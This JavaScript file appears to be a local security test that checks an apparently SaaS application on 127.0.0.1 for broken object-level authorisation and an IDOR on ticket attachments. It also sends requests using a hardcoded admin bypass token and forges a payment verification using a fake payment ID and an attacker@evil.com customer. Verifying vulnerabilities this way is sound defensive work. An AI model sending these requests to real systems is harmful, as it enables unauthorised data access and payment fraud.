async function testVulnerabilities() {
  console.log('Testing BOLA and Auth Bypass Vulnerabilities against local server (http://127.0.0.1:5000)...');

  // Test 1: BOLA on /api/customer/overview without any auth token, just header spoofing
  try {
    const res = await fetch('http://127.0.0.1:5000/api/customer/overview', {
      headers: {
        'x-user-company': 'Maan Corp',
        'x-user-email': 'admin@maan.oxoo.ai'
      }
    });
    const data = await res.json();
    console.log('\n[TEST 1] /api/customer/overview with spoofed x-user-company & x-user-email:');
    console.log('  HTTP Status:', res.status);
    console.log('  Data Returned without Auth Token:', {
      companyName: data.organization?.name,
      plan: data.organization?.plan,
      activeApps: data.organization?.active_apps,
      ticketsCount: data.stats?.openTickets
    });
    if (res.status === 200 && data.organization?.name === 'Maan Corp') {
      console.log('  >>> CONFIRMED VULNERABILITY (BOLA-01): Full organization data returned to unauthenticated caller!');
    }
  } catch (err) {
    console.error('Test 1 error:', err.message);
  }

  // Test 2: Admin Bypass with demo-admin-jwt-token-88
  try {
    const res = await fetch('http://127.0.0.1:5000/api/admin/overview', {
      headers: {
        'Authorization': 'Bearer demo-admin-jwt-token-88'
      }
    });
    const data = await res.json();
    console.log('\n[TEST 2] /api/admin/overview with static bypass token (demo-admin-jwt-token-88):');
    console.log('  HTTP Status:', res.status);
    console.log('  Admin Overview Returned:', {
      totalCustomers: data.stats?.totalCustomers,
      totalRevenue: data.stats?.totalRevenue,
      activeSubscriptions: data.stats?.activeSubscriptions
    });
    if (res.status === 200 && data.stats) {
      console.log('  >>> CONFIRMED VULNERABILITY (AUTH-01): Full super admin access granted via hardcoded bypass token!');
    }
  } catch (err) {
    console.error('Test 2 error:', err.message);
  }

  // Test 3: Unauthenticated Ticket Attachment Access (IDOR)
  try {
    const res = await fetch('http://127.0.0.1:5000/api/tickets/attachments/1');
    console.log('\n[TEST 3] GET /api/tickets/attachments/1 without authentication:');
    console.log('  HTTP Status:', res.status);
    if (res.status !== 401 && res.status !== 403) {
      console.log('  >>> CONFIRMED VULNERABILITY (FILE-02): Endpoint does not enforce authentication or tenant isolation!');
    }
  } catch (err) {
    console.error('Test 3 error:', err.message);
  }

  // Test 4: Forged Payment Verification without Cryptographic Signature
  try {
    const fakeOrderNumber = `OXOO-ORD-TEST-${Date.now().toString().slice(-4)}`;
    const res = await fetch('http://127.0.0.1:5000/api/payment/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        orderNumber: fakeOrderNumber,
        paymentId: 'fake_pay_id_12345',
        companyName: 'Adversarial Test Corp',
        customerName: 'Attacker',
        customerEmail: 'attacker@evil.com',
        selectedApps: ['HRMS', 'Finance'],
        planName: 'Enterprise Plan',
        billingCycle: 'yearly',
        totalAmount: 99999
      })
    });
    const data = await res.json();
    console.log('\n[TEST 4] POST /api/payment/verify with forged paymentId & no signature:');
    console.log('  HTTP Status:', res.status);
    console.log('  Response:', data);
    if (res.status === 200 && data.success) {
      console.log('  >>> CONFIRMED VULNERABILITY (PAY-01): Active enterprise subscription and invoice created without Razorpay cryptographic verification!');
    }
  } catch (err) {
    console.error('Test 4 error:', err.message);
  }
}

testVulnerabilities();
